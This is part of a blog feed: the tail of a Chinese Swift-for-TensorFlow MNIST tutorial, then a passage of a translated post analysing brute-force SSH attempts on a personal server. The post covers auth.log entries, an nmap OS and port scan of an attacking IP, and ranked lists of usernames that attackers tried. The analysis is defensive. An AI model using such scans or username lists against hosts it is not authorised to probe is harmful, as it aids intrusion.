Relations"</span></span><br></pre></td></tr></table></figure><h3 id="循环">循环</h3><p>除了支持经典的循环之外，Swift有一些自定义的比较独特的循环形式：</p><h4 id="for...in-loop">for...in loop</h4><p>类似Python的写法，在Swift中，你可以以如下形式来遍历列表Lists或者ranges</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">0</span>...<span class="number">5</span> &#123;</span><br><span class="line">  <span class="built_in">print</span>(i)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> someList = [<span class="number">20</span>, <span class="number">30</span>, <span class="number">10</span>, <span class="number">40</span>]</span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> someList &#123;</span><br><span class="line">  <span class="built_in">print</span>(item * <span class="number">2</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的连续三个点的符号用来创建ranges。<code>...</code>创建的两侧是闭集， 如果要创建不包含最右侧的变量的范围，使用<code>..&lt;</code>符号即可。</p><blockquote><p>注意Swift使用花括号，而非缩进形式来表示代码层次结构</p></blockquote><p>在Swift中也可以使用比较经典的while和for循环。<a href="https://docs.swift.org/swift-book/LanguageGuide/ControlFlow.html" target="_blank" rel="noopener">You can learn more about loops in Swift here</a></p><h3 id="条件">条件</h3><p>这里就是非常经典的if语句了，不做赘述。</p><blockquote><p>Swift中条件语句针对Optional类型做了专门的优化。</p></blockquote><h3 id="函数">函数</h3><p>下图是Swift函数的定义形式</p><p><img src="https://imgs.codewoody.com/uploads/big/ab6365a6d34703b1ef7dd5c72d67e200.png"></p><h3 id="代码中的注释">代码中的注释</h3><p>Swift中的注释形式和C/C++比较像：用<code>//</code>来开始行注释，用<code>/* ... */</code>来常见块注释。在代码中多写注释是一个好习惯。</p><h3 id="在swift中使用python的库">在Swift中使用Python的库</h3><p>Swift支持和Python的互操作，这意味着你可以直接在Swift中使用大部分Python库：调用函数或者做变量的类型转换。这个特性大大增强了Swift的功能。尽管Swift的生态还非常年轻，但是我们可以直接使用非常成熟的Python库，如Numpy，Pandas还有Matplotlib等。</p><p>为了引用Python模块，我们只需要将Swift的<code>Python</code>模块导入，然后使用这个模块的接口即可：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Python</span><br><span class="line"></span><br><span class="line"><span class="comment">// Load numpy from python</span></span><br><span class="line"><span class="keyword">let</span> np = <span class="type">Python</span>.<span class="keyword">import</span>("numpy")</span><br><span class="line"></span><br><span class="line"><span class="comment">// create array of zeros</span></span><br><span class="line"><span class="keyword">var</span> zeros = np.ones([<span class="number">2</span>, <span class="number">3</span>])</span><br><span class="line"><span class="built_in">print</span>(zeros)</span><br></pre></td></tr></table></figure><p>matplotlib库也可以直接导入：</p><p><img src="https://imgs.codewoody.com/uploads/big/9223622e676db4d5e4cb7b29029d2b2c.png"></p><h2 id="在swift中使用tensorflow创建一个基础模型">在Swift中使用Tensorflow创建一个基础模型</h2><p><img src="https://imgs.codewoody.com/uploads/big/d0bfb4405b609c516a0496dcf9d5d6fb.png"></p><p>Swift4Tensorflow是Swift生态中一个非常成熟的库。我们可以用非常类似Keras的方式来创建机器学习和深度学习的模块。</p><p>有意思的是，Swift4Tensorflow不只是一个简单的Tensorflow的Swift语言打包，而是根据Swift本身语言开发的库。未来这个库可能会变成Swift的语言的核心部分。</p><blockquote><p><i>What this means is that the amazing set of Engineers from Apple’s Swift team and Google’s Tensorflow team will make sure that you are able to do high-performance machine learning in Swift.</i></p></blockquote><p>这个库加入了一些Swift语言的有用特性，如自动微分支持（这让我想起了PyTorch中的Autogrid）。</p><p><img src="https://imgs.codewoody.com/uploads/big/b0ca21f0935f746d295e396801745a8d.png"></p><h3 id="关于数据集">关于数据集</h3><p>首先让我们来解释一下这个section的问题。如果你之前接触过深度学习领域，你应该比较熟悉了。</p><p>我们将会建立一个卷积神经网络(CNN)模型来将MNIST数据集中的图片识别为数字字符。MNIST数据集包括60,000个训练图像和10,000个测试图像。图像为手写的数字字符。</p><p><img src="https://imgs.codewoody.com/uploads/big/8eb4727e890c2a4a24e5bacff634c764.png"></p><p>这个数据集是研究计算机视觉的时候一个非常常用的数据集，所以我在这里不做细节性的描述。要了解更多，你可以读一下<a href="https://en.wikipedia.org/wiki/MNIST_database" target="_blank" rel="noopener">这个</a>。</p><h3 id="配置羡慕">配置羡慕</h3><p>在我们开始创建模块之前。我们需要下载数据集并进行预处理。为了你的方便我已经创建了一个Github仓库，提供了预处理代码以及数据。让我们下载配置代码，下载数据集并导入黑色的库。</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">%include <span class="string">"EnableIPythonDisplay.swift"</span></span><br><span class="line"><span class="type">IPythonDisplay</span>.shell.enable_matplotlib(<span class="string">"inline"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> Foundation</span><br><span class="line"><span class="keyword">import</span> Python</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> os = <span class="type">Python</span>.<span class="keyword">import</span>("os")</span><br><span class="line"><span class="keyword">let</span> plt = <span class="type">Python</span>.<span class="keyword">import</span>("matplotlib.pyplot")</span><br><span class="line"></span><br><span class="line">os.system(<span class="string">"git clone https://github.com/mohdsanadzakirizvi/swift-datascience.git"</span>)</span><br><span class="line">os.chdir(<span class="string">"/content/swift-datascience"</span>)</span><br></pre></td></tr></table></figure><p>运行上面的代码，数据集就会下载到Colab的环境中了。</p><blockquote><p>在本地运行时代码应该需要修改，这个我们后面来讨论</p><p>不过这个操作太丑陋了，没有使用Swift的native方法来调用shell命令。</p></blockquote><h3 id="载入数据">载入数据</h3><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">%include <span class="string">"/content/swift-datascience/MNIST.swift"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Load dataset</span></span><br><span class="line"><span class="keyword">let</span> dataset = <span class="type">MNIST</span>(batchSize: <span class="number">128</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Get first 5 images</span></span><br><span class="line"><span class="keyword">let</span> imgs = dataset.trainingImages.minibatch(at: <span class="number">0</span>, batchSize: <span class="number">5</span>).makeNumpyArray()</span><br><span class="line"><span class="built_in">print</span>(imgs.shape)</span><br></pre></td></tr></table></figure><h3 id="查看一下数据集">查看一下数据集</h3><p>我们尝试画出数据集中的图片来看看我们要处理的问题：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># <span class="type">Display</span> first <span class="number">5</span> images</span><br><span class="line"><span class="keyword">for</span> img <span class="keyword">in</span> imgs&#123;</span><br><span class="line">  plt.imshow(img.reshape(<span class="number">28</span>,<span class="number">28</span>))</span><br><span class="line">  plt.show()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>画出来大概是下面的样子：</p><p><img src="https://imgs.codewoody.com/uploads/big/4505b19dc02e603f5e155e899b4073a7.png"></p><h3 id="定义模型结构">定义模型结构</h3><p>现在让我们来定义我们的模型的结构。这里我使用了LeNet-5架构，一个非常基础的CNN模型，包含两个卷基层，average pooling还有三个Dense层【~应该是全连接层？】。最后一级dense layer的输出维数是10，因为我们有10个类别要输出，分别代表0-9.</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> TensorFlow</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> epochCount = <span class="number">100</span></span><br><span class="line"><span class="keyword">let</span> batchSize = <span class="number">128</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The LeNet-5 model</span></span><br><span class="line"><span class="keyword">var</span> classifier = <span class="type">Sequential</span> &#123;</span><br><span class="line">    <span class="type">Conv2D</span>&lt;<span class="type">Float</span>&gt;(filterShape: (<span class="number">5</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">6</span>), padding: .same, activation: relu)</span><br><span class="line">    <span class="type">AvgPool2D</span>&lt;<span class="type">Float</span>&gt;(poolSize: (<span class="number">2</span>, <span class="number">2</span>), strides: (<span class="number">2</span>, <span class="number">2</span>))</span><br><span class="line">    <span class="type">Conv2D</span>&lt;<span class="type">Float</span>&gt;(filterShape: (<span class="number">5</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">16</span>), activation: relu)</span><br><span class="line">    <span class="type">AvgPool2D</span>&lt;<span class="type">Float</span>&gt;(poolSize: (<span class="number">2</span>, <span class="number">2</span>), strides: (<span class="number">2</span>, <span class="number">2</span>))</span><br><span class="line">    <span class="type">Flatten</span>&lt;<span class="type">Float</span>&gt;()</span><br><span class="line">    <span class="type">Dense</span>&lt;<span class="type">Float</span>&gt;(inputSize: <span class="number">400</span>, outputSize: <span class="number">120</span>, activation: relu)</span><br><span class="line">    <span class="type">Dense</span>&lt;<span class="type">Float</span>&gt;(inputSize: <span class="number">120</span>, outputSize: <span class="number">84</span>, activation: relu)</span><br><span class="line">    <span class="type">Dense</span>&lt;<span class="type">Float</span>&gt;(inputSize: <span class="number">84</span>, outputSize: <span class="number">10</span>, activation: softmax)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>你可能已经注意到了，上面的代码和你在Keras（或者PyTorch，TensorFlow）中写的Python代码非常类似</p><blockquote><p><i>The simplicity of writing code is one of the biggest points of Swift.</i></p></blockquote><p>Swift4Tensorflow支持很多现成的多层模型。更多阅读参考：<a href="https://www.tensorflow.org/swift/api_docs/Structs" target="_blank" rel="noopener">https://www.tensorflow.org/swift/api_docs/Structs</a></p><h3 id="选择梯度下降作为optimizer">选择梯度下降作为Optimizer</h3><p>类似的，这里我们也需要选择Optimizer来优化我们的模型。我们这里选择使用随机梯度下降算法(stochastic gradient descent, SGD)。</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> optimizer = <span class="type">SGD</span>(<span class="keyword">for</span>: classifier, learningRate: <span class="number">0.1</span>)</span><br></pre></td></tr></table></figure><p>Swift4Tensorflow还支持很多Optimizer：</p><ul><li>AMSGrad</li><li>AdaDelta</li><li>AdaGrad</li><li>AdaMax</li><li>Adam</li><li>Parameter</li><li>RMSProp</li><li>SGD</li></ul><h3 id="模型训练">模型训练</h3><p>现在万事俱备了，让我们开始训练模型吧。</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">"Beginning training..."</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Statistics</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> correctGuessCount: <span class="type">Int</span> = <span class="number">0</span></span><br><span class="line">    <span class="keyword">var</span> totalGuessCount: <span class="type">Int</span> = <span class="number">0</span></span><br><span class="line">    <span class="keyword">var</span> totalLoss: <span class="type">Float</span> = <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Store accuracy results during training</span></span><br><span class="line"><span class="keyword">var</span> trainAccuracyResults: [<span class="type">Float</span>] = []</span><br><span class="line"><span class="keyword">var</span> testAccuracyResults: [<span class="type">Float</span>] = []</span><br><span class="line"></span><br><span class="line"><span class="comment">// The training loop.</span></span><br><span class="line"><span class="keyword">for</span> epoch <span class="keyword">in</span> <span class="number">1</span>...epochCount &#123;</span><br><span class="line">    <span class="keyword">var</span> trainStats = <span class="type">Statistics</span>()</span><br><span class="line">    <span class="keyword">var</span> testStats = <span class="type">Statistics</span>()</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set context to training </span></span><br><span class="line">    <span class="type">Context</span>.local.learningPhase = .training</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">0</span> ..&lt; dataset.trainingSize / batchSize &#123;</span><br><span class="line">        <span class="comment">// Get mini-batches of x and y</span></span><br><span class="line">        <span class="keyword">let</span> x = dataset.trainingImages.minibatch(at: i, batchSize: batchSize)</span><br><span class="line">        <span class="keyword">let</span> y = dataset.trainingLabels.minibatch(at: i, batchSize: batchSize)</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// Compute the gradient with respect to the model.</span></span><br><span class="line">        <span class="keyword">let</span> 𝛁model = classifier.gradient &#123; classifier -&gt; <span class="type">Tensor</span>&lt;<span class="type">Float</span>&gt; <span class="keyword">in</span></span><br><span class="line">            <span class="keyword">let</span> ŷ = classifier(x)</span><br><span class="line">            <span class="keyword">let</span> correctPredictions = ŷ.argmax(squeezingAxis: <span class="number">1</span>) .== y</span><br><span class="line">            </span><br><span class="line">            trainStats.correctGuessCount += <span class="type">Int</span>(<span class="type">Tensor</span>&lt;<span class="type">Int32</span>&gt;(correctPredictions).sum().scalarized())</span><br><span class="line">            trainStats.totalGuessCount += batchSize</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">let</span> loss = softmaxCrossEntropy(logits: ŷ, labels: y)</span><br><span class="line">            trainStats.totalLoss += loss.scalarized()</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">return</span> loss</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// Update the model's differentiable variables along the gradient vector.</span></span><br><span class="line">        optimizer.update(&amp;classifier, along: 𝛁model)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set context to inference</span></span><br><span class="line">    <span class="type">Context</span>.local.learningPhase = .inference</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">0</span> ..&lt; dataset.testSize / batchSize &#123;</span><br><span class="line">        <span class="keyword">let</span> x = dataset.testImages.minibatch(at: i, batchSize: batchSize)</span><br><span class="line">        <span class="keyword">let</span> y = dataset.testLabels.minibatch(at: i, batchSize: batchSize)</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Compute loss on test set</span></span><br><span class="line">        <span class="keyword">let</span> ŷ = classifier(x)</span><br><span class="line">        <span class="keyword">let</span> correctPredictions = ŷ.argmax(squeezingAxis: <span class="number">1</span>) .== y</span><br><span class="line"></span><br><span class="line">        testStats.correctGuessCount += <span class="type">Int</span>(<span class="type">Tensor</span>&lt;<span class="type">Int32</span>&gt;(correctPredictions).sum().scalarized())</span><br><span class="line">        testStats.totalGuessCount += batchSize</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> loss = softmaxCrossEntropy(logits: ŷ, labels: y)</span><br><span class="line"></span><br><span class="line">        testStats.totalLoss += loss.scalarized()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> trainAccuracy = <span class="type">Float</span>(trainStats.correctGuessCount) / <span class="type">Float</span>(trainStats.totalGuessCount)</span><br><span class="line">    <span class="keyword">let</span> testAccuracy = <span class="type">Float</span>(testStats.correctGuessCount) / <span class="type">Float</span>(testStats.totalGuessCount)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Save train and test accuracy</span></span><br><span class="line">    trainAccuracyResults.append(trainAccuracy)</span><br><span class="line">    testAccuracyResults.append(testAccuracy)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"""</span></span><br><span class="line"><span class="string">          [Epoch \(epoch)] \</span></span><br><span class="line"><span class="string">          Training Loss: \(trainStats.totalLoss), \</span></span><br><span class="line"><span class="string">          Training Accuracy: \(trainStats.correctGuessCount)/\(trainStats.totalGuessCount) \</span></span><br><span class="line"><span class="string">          (\(trainAccuracy)), \</span></span><br><span class="line"><span class="string">          Test Loss: \(testStats.totalLoss), \</span></span><br><span class="line"><span class="string">          Test Accuracy: \(testStats.correctGuessCount)/\(testStats.totalGuessCount) \</span></span><br><span class="line"><span class="string">          (\(testAccuracy))</span></span><br><span class="line"><span class="string">          """</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>上面的代码中用了一些fancy的数学符号，但是由于这些符号输入并不方便，因此实际编程中我们不会这么做。</p></blockquote><p>上面的代码流程中我们将数据集的样本传递给模型，帮助其改善预测精度。训练步骤如下：</p><ol type="1"><li>训练重复若干次，每次我们遍历整个训练集。</li><li>在每次训练迭代中，我们逐个传入features(<code>x</code>)和labels(<code>y</code>)，这对下一步非常重要。</li><li>使用样本的features，使用模型做出预测，并与labels提供的真值进行比对，进而计算出模型的损失函数和下降梯度方向。</li><li>这是梯度下降算法发挥了作用，我们沿着梯度方向更新模型的变量。</li><li>追踪训练过程中的一些统计数据来方便我们后续做可视化。</li><li>在第一步提到的重复训练中，每次重复2至5步。</li></ol><p><code>epochCount</code>变量为重复遍历数据集的次数。你可以修改其值尝试一下。</p><p>需要多少次遍历来取得90%以上的正确率呢？我可以在12次训练下在训练集和测试集上获得97%以上的正确率。</p><p><img src="https://imgs.codewoody.com/uploads/big/5b367d407d32802ecce0bcd33b3e9f9a.png" alt style="border: none;"></p><h3 id="可视化输出训练过程">可视化输出训练过程</h3><p>用下面的方法我么可以可视化输出训练过程中的误差演变过程：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">plt.figure(figsize: [<span class="number">12</span>, <span class="number">8</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> accuracyAxes = plt.subplot(<span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line">accuracyAxes.set_ylabel(<span class="string">"Train Accuracy"</span>)</span><br><span class="line">accuracyAxes.plot(trainAccuracyResults, color: <span class="string">"blue"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> lossAxes = plt.subplot(<span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line">lossAxes.set_ylabel(<span class="string">"Test Accuracy"</span>)</span><br><span class="line">lossAxes.set_xlabel(<span class="string">"Epoch"</span>)</span><br><span class="line">lossAxes.plot(testAccuracyResults, color: <span class="string">"yellow"</span>)</span><br><span class="line"></span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p>得到的结果如下图所示：</p><p><img src="https://imgs.codewoody.com/uploads/big/0db98a3b3315f281946c68ec3ad9cf57.png"></p><h2 id="swift数据科学应用的未来">Swift数据科学应用的未来</h2><p>有产业专家对Swift做出了很高的评价，认为其有潜力成为数据科学的主流语言，同时也能成为机器学习类应用开发的主要工具。</p><p>目前，很多fancy的数据科学相关的Swift库还在开发中，其背后有强大的业界支持。我非常看好Swift生态的未来--甚至会比现在的Python更加强大。</p><p>下面是一些你可以进一步研究的Swift库：</p><ul><li><a href="https://github.com/nifty-swift/Nifty-demo" target="_blank" rel="noopener">Nifty(Demo)</a>: Swift的通用数值就散库</li><li><a href="https://github.com/KarthikRIyer/swiftplot" target="_blank" rel="noopener">Swiftplot</a>: Swift的数据可视化库</li><li><a href="https://github.com/tensorflow/swift" target="_blank" rel="noopener">Swift for Tensorflow</a>: 下一代的机器学习平台</li><li><a href="https://github.com/Swift-AI/Swift-AI" target="_blank" rel="noopener">Swift AI</a>: 基于Swift的高性能深度学习框架</li></ul><p>本文涉及的所有代码<a href="https://github.com/mohdsanadzakirizvi/swift-datascience" target="_blank" rel="noopener">托管在Github上</a>。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;https://imgs.codewoody.com/uploads/big/b5e001b9f8a4d9dafcd5ec496a58de85.jpg&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>【翻译】分析恶意SSH访问</title>
    <link href="http://www.codewoody.com/posts/46352/"/>
    <id>http://www.codewoody.com/posts/46352/</id>
    <published>2019-11-29T10:32:27.000Z</published>
    <updated>2020-01-15T08:07:20.709Z</updated>
    
    <content type="html"><![CDATA[<p>这篇文章翻译自<a href="https://bastian.rieck.me/blog/posts/2019/ssh_incidents/" target="_blank" rel="noopener">Analysing nefarious ssh access attempts</a>，非核心内容有删改。</p><p>维护我自己的服务器让我在过去的若干年里面学会了很多事情。也让我对那些勇敢的同时维护多个服务器的系统管理员抱有更高的敬意。这篇文章将会讲述我在维护自己的服务器的过程中经常发生的一些奇怪的事情。</p><a id="more"></a><h2 id="analysing-ip-addresses">Analysing IP addresses</h2><p>更准确地而言，我们在这里是要寻找对我们的服务器发出的恶意ssh访问请求。这里，恶意的访问请求是指使用无效的ssh密码来尝试访问服务器。由于我管理服务器上所有的用户都使用公钥来访问服务器，因此无效密码这个评价指标是非常站得住脚的。首先让我们收集一点证据。所有的认证请求都会被记录在<code>/var/log/auth.log</code>文件中（或者历史版本）。这个文件的结构非常简单：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Feb 25 00:07:21 myrddin sshd[22071]: Failed password for root from X.X.X.X port 493 ssh2</span><br><span class="line">Feb 25 00:07:28 myrddin sshd[22075]: Invalid user ftpadmin from X.X.X.X port 567</span><br></pre></td></tr></table></figure><blockquote><p>这个文件中不只存储了sshd的认证请求，其他的，例如sudo的认证信息也在这个文件夹</p></blockquote><p>注意到日志条目对于访问者是使用已有用户名还是不存在的用户名上，采用了不同的记录方式。作者用一个python脚本过滤枚举了所有的连接请求，并按照IP排序。一共有983892条记录（大概在一个月的时间里），其中大约17%可能与恶意访问有关。事实上在统计这个数字的时候已经忽略了无效密码【~这里的无效密码应该指不符合格式要求的密码，而非指错误的密码】和无效用户名的情况，所以17%这个数字其实是偏低的。</p><p>在进一步检查了IP来源之后我觉得更有意思了。大约3个独特的IP地址，占了所有无效密码请求的25%。为了隐私问题，这里不列举具体的IP了，不过可以说的是这三个IP地址的ISP都来自中国。其中两个是中国电信，另一个是中国联通，尽管这两个ISP都列出了投诉的邮件，不过作者怀疑举报了也不会有什么卵用。</p><p>接下来我尝试用<code>nmap</code>搜集更多的消息：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -O -Pn X.X.X.X</span><br></pre></td></tr></table></figure><p>对于两个中国电信的IP地址，对方只开放了一个端口可以访问，为端口25。尽管这个端口我没法访问，不过<code>nmap</code>命令反映出对方可能是<code>FreeBSD 6.2-Release</code>系统【~这很可能指向的只是一个路由网关，而非实际的服务器】。不过对于第三个中国联通的IP地址，<code>nmap</code>挖掘出来的结果要更有意思一些。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for X.X.X.X</span><br><span class="line">Host is up (0.18s latency).</span><br><span class="line">Not shown: 977 closed ports</span><br><span class="line">PORT     STATE    SERVICE</span><br><span class="line">22/tcp   open     ssh</span><br><span class="line">25/tcp   open     smtp</span><br><span class="line">80/tcp   filtered http</span><br><span class="line">111/tcp  filtered rpcbind</span><br><span class="line">135/tcp  filtered msrpc</span><br><span class="line">139/tcp  filtered netbios-ssn</span><br><span class="line">199/tcp  filtered smux</span><br><span class="line">445/tcp  filtered microsoft-ds</span><br><span class="line">593/tcp  filtered http-rpc-epmap</span><br><span class="line">901/tcp  filtered samba-swat</span><br><span class="line">1025/tcp filtered NFS-or-IIS</span><br><span class="line">1034/tcp filtered zincite-a</span><br><span class="line">1068/tcp filtered instl_bootc</span><br><span class="line">1434/tcp filtered ms-sql-m</span><br><span class="line">3128/tcp filtered squid-http</span><br><span class="line">4444/tcp filtered krb524</span><br><span class="line">5800/tcp filtered vnc-http</span><br><span class="line">5900/tcp filtered vnc</span><br><span class="line">6006/tcp open     X11:6</span><br><span class="line">6129/tcp filtered unknown</span><br><span class="line">6667/tcp filtered irc</span><br><span class="line">6669/tcp filtered irc</span><br><span class="line">8080/tcp filtered http-proxy</span><br><span class="line">Device type: general purpose|WAP|storage-misc|broadband router</span><br><span class="line">Running (JUST GUESSING): Linux 3.X|4.X|2.6.X|2.4.X (95%), Asus embedded (92%), HP embedded (91%)</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel cpe:/h:asus:rt-ac66u cpe:/h:hp:p2000_g3 cpe:/o:linux:linux_kernel:3.4 cpe:/o:linux:linux_kernel:2.6.22 cpe:/o:linux:linux_kernel:2.4</span><br><span class="line">Aggressive OS guesses: Linux 3.10 - 4.11 (95%), Linux 3.13 (95%), Linux 3.13 or 4.2 (95%), Linux 4.2 (95%), Linux 4.4 (95%), Linux 3.16 (94%), Linux 3.16 - 4.6 (94%), Linux 3.12 (93%), Linux 3.2 - 4.9 (93%), Linux 3.8 - 3.11 (93%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Network Distance: 16 hops</span><br><span class="line"></span><br><span class="line">OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 58.88 seconds</span><br></pre></td></tr></table></figure><p>这里显示服务器是使用的<code>OpenSSH_6.9p1 Ubuntu-2 pat</code>，可以使用密码或者秘钥登录。所以理论上我可以以其人之道还治其人之身。</p><h2 id="analysing-user-names">Analysing User Names</h2><p>让我们分析一下所有的恶意请求中使用的有效用户名的比例：</p><ol type="1"><li>root (98.42%)</li><li>backup (0.29%)</li><li>www-data (0.14%)</li><li>ghost (0.11%)</li><li>nobody (0.08%)</li></ol><p>很明显绝大多数恶意请求的目标都是root。不过这些用户其实都不允许通过ssh登录的，攻击者不知道这点。对于使用无效用户名的登录请求，其分布就比较分散了。比例最高的10个我们列出如下：</p><ol type="1"><li>admin (4.57%)</li><li>test (3.81%)</li><li>user (3.07%)</li><li>ubuntu (2.64%)</li><li>ftpuser (2.40%)</li><li>postgres (1.19%)</li><li>oracle (1.10%)</li><li>nagios (1.08%)</li><li>git 